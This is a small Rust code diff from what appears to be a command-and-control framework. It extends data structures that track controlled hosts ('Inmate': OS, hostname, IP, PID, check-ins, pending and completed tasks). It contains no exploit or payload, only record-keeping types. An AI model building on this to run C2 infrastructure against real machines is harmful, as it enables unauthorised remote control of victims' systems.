@@ -3,7 +3,7 @@ pub mod actions;
 use actions::{c2_actions, RequestActionType, ResponseActionType};
 
 
-#[derive(Serialize, Deserialize, Debug)]
+#[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct CheckInResponse {
     pub task: c2_actions,
     pub task_parameters: String,
@@ -16,6 +16,7 @@ pub struct PostRequest {
     pub action_parameters: String,
     pub content: Vec<u8>,
 }
+
 impl PostRequest {
     pub fn new(timestamp: u64, action_type: c2_actions, action_parameters: String, content: Vec<u8>) -> Self {
         PostRequest {
@@ -27,16 +28,25 @@ impl PostRequest {
     }
 }
 
-#[derive(Serialize, Deserialize, Debug)]
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct PostRequestHeaders {
+    pub timestamp: u64,
+    pub action_type: c2_actions,
+    pub action_parameters: String,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct Inmate {
     pub rowid: u32,
     pub os: String,
     pub hostname: String,
     pub ip: String,
     pub pid: u32,
-    pub last_checkin: u32,
+    pub last_checkin: u64,
     pub pending_instruct: String,
     pub pending_instruct_type: c2_actions,
+    pub request_actions: Vec<CheckInResponse>,
+    pub completed_actions: Vec<PostRequestHeaders>,
 }
 /* 
 
